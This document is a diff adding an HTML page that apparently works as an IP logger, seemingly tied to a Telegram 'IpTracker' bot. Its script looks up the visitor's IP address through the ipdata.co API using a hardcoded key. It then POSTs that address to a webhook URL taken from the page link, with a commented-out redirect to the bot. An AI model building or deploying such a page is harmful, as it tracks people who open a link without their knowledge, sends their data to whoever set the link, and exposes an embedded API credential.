@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <script type="text/javascript" src="https://code.jquery.com/jquery-1.7.1.min.js"></script>
+<script>
+  function json(url) { return fetch(url).then(res => res.json()); } 
+let apiKey = 'b2edc259cf2e9dd411c22cbefcc0f594c0b0b21d3e8fdd5ec14ff566'; json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+ //setTimeout(function() {
+    //window.location.href = 'https://t.me/IpTracker_V1Bot';
+ // }, 3000);
+ document.write("\{ \"ip\" : \""+data.ip+"\" \}"); 
+var dat = {
+  ip: data.ip
+};
+const params = new Proxy(new URLSearchParams(window.location.search), {
+  get: (searchParams, prop) => searchParams.get(prop),
+});
+// Get the value of "some_key" in eg "https://example.com/?some_key=some_value"
+let value = params.webhookUrl; // "
+$.ajax({ url: value, method: 'POST', contentType: 'application/json', crossDomain: true, headers: { ip: data.ip }, data: JSON.stringify(dat) }) .success(function(response) { console.log(response);
+});
+//console.log(data.city); console.log(data.country_code); // so many more properties 
+});
+</script>
+  <script>
+
+</script>
+ </html>
